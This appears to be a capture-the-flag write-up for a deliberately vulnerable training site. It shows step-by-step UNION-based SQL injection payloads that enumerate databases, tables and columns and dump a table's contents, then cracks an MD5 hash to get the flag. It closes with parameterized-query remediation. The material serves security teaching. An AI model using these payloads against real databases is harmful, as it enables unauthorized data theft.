On the page http://IP/index.php?page=searching


To get the request columns number: if the number of select params is more or less then 2 the query break
    1 UNION SELECT NULL, NULL--
    ==> 2 cols

Retrieve database names:
    1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata--

    ========================================
    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
    Title: information_schema
    Url : 
    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
    Title: Member_Brute_Force
    Url : 
    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
    Title: Member_Sql_Injection
    Url : 
    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
    Title: Member_guestbook
    Url : 
    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
    Title: Member_images
    Url : 
    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
    Title: Member_survey
    Url : 
    ========================================

==> Member_images

Retrieve table names:
    1 UNION ALL SELECT NULL,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=0x4d656d6265725f696d61676573-- 

==> list_images

Get the list_images columns names

    1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=0x4d656d6265725f696d61676573 AND TABLE_NAME = 0x6c6973745f696d61676573--

===> id, url, title, comment


See all images's data:

    1 UNION SELECT id, CONCAT(url, CHAR(10) , title ,CHAR(10), comment) FROM list_images--
    ========================================
    ID: 1 UNION SELECT id, CONCAT(url, CHAR(10) , title ,CHAR(10), comment) FROM list_images-- 
    Title: borntosec.ddns.net/images.png
    Hack me ?
    If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
    Url : 5
    ========================================

    Decrypt the hash with md5 we get ===> 'albatroz'
    we crypt it with Sha256 we get the flag ==> 'f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188'


solution:
    - use of prepared statements (with parameterized queries)
        https://techcommunity.microsoft.com/t5/sql-server-blog/how-and-why-to-use-parameterized-queries/ba-p/383483#:~:text=A%20parameterized%20query%20is%20a,to%20avoid%20SQL%20injection%20attacks
    - make sure the user input is just a number